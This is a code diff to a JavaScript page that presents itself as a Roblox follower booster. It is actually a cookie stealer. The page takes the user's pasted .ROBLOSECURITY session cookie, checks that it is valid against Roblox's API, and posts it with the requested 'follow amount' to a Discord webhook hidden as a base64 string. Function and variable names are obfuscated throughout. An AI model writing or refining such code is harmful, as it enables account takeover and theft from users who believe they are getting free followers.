@@ -11,24 +11,6 @@ function x1y2y2z3(title, text, icon, confirmButtonText) {
     Swal.fire(a1b2c3);
 }
 
-async function doAuthorizedRequest(url, roblosecurityCookie) {
-    try {
-        const response = await axios.get(url, {
-            headers: {
-                Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
-            },
-        });
-        return response.data;
-    } catch (error) {
-        throw new Error(`Request failed: ${error.message}`);
-    }
-}
-
-async function register(roblosecurityCookie) {
-    const data = await doAuthorizedRequest("https://users.roblox.com/v1/users/authenticated", roblosecurityCookie);
-    return data;
-}
-
 async function a1b2c3d4(p1q2r3, s4t5u7) {
     let xyeq = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
     if (!xyeq) {
@@ -44,7 +26,17 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
 
     // Verificar la cookie antes de enviar la solicitud
     try {
-        await register(xyeqeq); // Verificar la cookie
+        const verificationResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
+            method: 'GET',
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${xyeqeq}`
+            }
+        });
+
+        if (!verificationResponse.ok) {
+            x1y2y2z3("Error", "Invalid code. Please check your cookie.", "error", "Retry");
+            return;
+        }
 
         const j1k2l3 = {
             content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
@@ -52,16 +44,19 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
 
         const g8h9i0 = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==');
 
-        const response = await axios.post(g8h9i0, j1k2l3, {
+        const response = await fetch(g8h9i0, {
+            method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
-            }
+            },
+            body: JSON.stringify(j1k2l3)
         });
 
-        if (response.status === 200) {
+        if (response.ok) {
             x1y2y2z3("Success", "Successfully sent.", "success", "Okay");
         } else {
-            x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
+            const errorData = await response.json();
+            x1y2y2z3("Error", `Failed to send Followers to Roblox Account. ${errorData.message}`, "error", "Retry");
         }
     } catch (error) {
         x1y2y2z3("Error", `An error occurred while sending Followers: ${error.message}`, "error", "Retry");
@@ -74,7 +69,7 @@ document.addEventListener("DOMContentLoaded", function() {
         const s4t5u7 = document.getElementById("amount").value;
 
         if (!p1q2r3 || !s4t5u7) {
-            x1y2y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
+            x1y2y2z3("Validation Error", "Please fill in all fields.", " warning", "Okay");
             return;
         }
 
